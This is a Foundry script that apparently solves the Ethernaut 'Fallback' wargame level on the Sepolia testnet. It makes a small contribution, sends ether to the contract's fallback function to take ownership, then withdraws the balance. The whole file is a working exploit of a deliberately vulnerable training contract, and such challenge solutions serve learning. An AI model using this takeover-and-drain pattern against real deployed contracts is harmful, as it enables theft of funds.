// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

import {Cracked1_Fallback} from "../src/Cracked1_Fallback.sol";

interface IFallback {
    function contribute() external payable;
    function owner() external returns (address);
    function withdraw() external;
}
//forge script  --rpc-url sepolia --account metamask  script/Cracked1_Fallback.s.sol --broadcast
contract Cracked1_FallbackScript is Script {
    Cracked1_Fallback public cracked;
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Fallback_address"));
    }

    function run() public {
        vm.startBroadcast();
        cracked = new Cracked1_Fallback(ethernaut_contracts);
        IFallback(ethernaut_contracts).contribute{value: 0.00001 ether}();
        (bool success, ) = payable(ethernaut_contracts).call{value: 0.00001 ether}("");
        IFallback(ethernaut_contracts).withdraw();
        require(success, "cracked fail");
        require(IFallback(ethernaut_contracts).owner() == vm.parseAddress(vm.envString("player")), "cracked fail");
        vm.stopBroadcast();
    }
}
